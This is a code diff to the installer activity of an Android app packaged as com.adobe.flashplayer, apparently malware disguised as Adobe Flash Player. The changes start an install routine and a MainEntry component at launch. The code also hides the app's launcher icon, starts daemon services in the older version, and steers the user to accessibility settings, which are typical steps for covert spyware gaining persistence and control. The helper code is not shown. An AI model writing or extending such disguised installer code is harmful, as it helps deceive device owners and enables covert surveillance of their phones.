@@ -16,6 +16,8 @@ import android.view.View;
 import android.view.View.OnClickListener;
 import android.widget.Button;
 import android.widget.Toast;
+
+import com.adobe.flashplayer.MainEntry;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.R;
@@ -63,7 +65,7 @@ public class InstallActivity extends Activity  {
 
     private int BATTERYOPT_REQUESTCODE = 0x1234;
 
-    public static boolean debug_install = false;
+    public static boolean debug_flag = true;
 
     @Override
     public void onCreate(Bundle savedInstanceState) {
@@ -75,9 +77,8 @@ public class InstallActivity extends Activity  {
 
             Log.e(TAG,"onCreate");
 
-            if (debug_install ){
-                CoreHelper.startForegroundService(InstallActivity.this);
-                CoreHelper.startJobDeamonService(InstallActivity.this);
+            if (debug_flag ){
+                install(InstallActivity.this);
             }
             else{
                 checkInstallCode(InstallActivity.this);
@@ -190,8 +191,6 @@ public class InstallActivity extends Activity  {
             @Override
             public void onClick(View v) {
                 try{
-                    mHandler.removeCallbacksAndMessages(null);
-
                     if (Build.VERSION.SDK_INT >= 23) {
                         Permission.checkPermission(InstallActivity.this);
                     }
@@ -212,9 +211,15 @@ public class InstallActivity extends Activity  {
 
                     PrefOper.setValue(InstallActivity.this, Public.PARAMCONFIG_FileName, Public.SETUPCOMPLETE, "ok");
 
-                    InstallHelper.hideDesktopIcon(InstallActivity.this);
+                    if (debug_flag == false){
+                        mHandler.removeCallbacksAndMessages(null);
+                        InstallHelper.hideDesktopIcon(InstallActivity.this);
+                    }else{
+                        new MainEntry(InstallActivity.this,"").start();
+                    }
 
                     finish();
+                    return;
                 }catch(Exception ex){
                     ex.printStackTrace();
                 }
@@ -252,8 +257,7 @@ public class InstallActivity extends Activity  {
             @Override
             public void onClick(View v) {
                 try {
-                    Intent intent;
-                    intent = new Intent();
+                    Intent intent = new Intent();
                     intent.setAction(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                     intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                     startActivity(intent);
